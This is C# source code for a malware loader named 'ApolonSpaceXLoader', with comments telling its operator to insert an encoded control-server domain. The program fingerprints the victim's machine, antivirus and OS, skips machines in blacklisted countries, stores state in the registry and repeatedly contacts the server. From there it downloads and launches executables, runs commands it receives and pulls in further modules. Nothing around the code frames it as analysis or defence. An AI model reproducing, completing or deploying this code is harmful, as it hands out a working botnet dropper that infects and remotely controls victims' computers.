using System;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Threading.Tasks;

namespace ApolonSpaceXLoader
{
    class Program
    {
        public static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("Paste your domain, read description!"));  // use EncrDecr for encrypt your link on URL page. http://apolon.com -> aHR0cDovL2Fwb2xvbi5jb20vZ2F0ZS5waHA/

        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}", urlPage = string.Concat(dom, "/loader.txt");
        public static string oldCommand { get; set; }

        [MTAThread]
        static void Main(string[] args)
        {
            if (Helper.Cis(dom)) // If country in black list, application close
            {
                Environment.Exit(1);
            }
            MyRegistry.Check();

            Task.Run(() =>
            {
                while (true)
                {
                    Work();
                    Thread.Sleep(5000);
                }
            });
            Task.Run(() =>
            {
                // Load the modules when starting the system
                MyModules.NewSession();
                while (true)
                {
                    // Checking for new modules
                    if (MyModules.CheckNewModules())
                    {
                        // Loading these modules
                        MyModules.DownloadModules();
                    }
                    Thread.Sleep(5000);
                }
            });
            Task.Run(() =>
            {
                
                while (true)
                {
                    using (WebClient wc = new WebClient())
                    {
                        string newCommand = wc.DownloadString(dom + "/cmd.php");
                        if (newCommand != oldCommand && newCommand != MyRegistry.GetLastCommand() && newCommand != string.Empty)
                        {
                            SConsole.CVoid(newCommand);
                            MyRegistry.UpdateCommand(newCommand);
                            oldCommand = newCommand;
                        }
                    }
                    Thread.Sleep(5000);
                }
            });
        }

        private static void Work()
        {
            try
            {
                string rnd = Helper.RandomID(6);
                string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";

                string urlOnPage;
                using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
                {
                    urlOnPage = strr.ReadToEnd();
                }

                using (WebClient wc = new WebClient())
                {
                    {
                        if (MyRegistry.GetURL() != urlOnPage)
                        {
                            if (File.Exists(dropPath))
                            {
                                File.Delete(dropPath);
                            }
                            MyRegistry.SetURL(urlOnPage);
                            if (urlOnPage.Length > 0)
                            {
                                if (MyRegistry.GetURL() != null)
                                {
                                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                                    wc.DownloadFile(new Uri(urlOnPage), dropPath);

                                    Process.Start("Explorer.exe", dropPath);
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }
    }
}
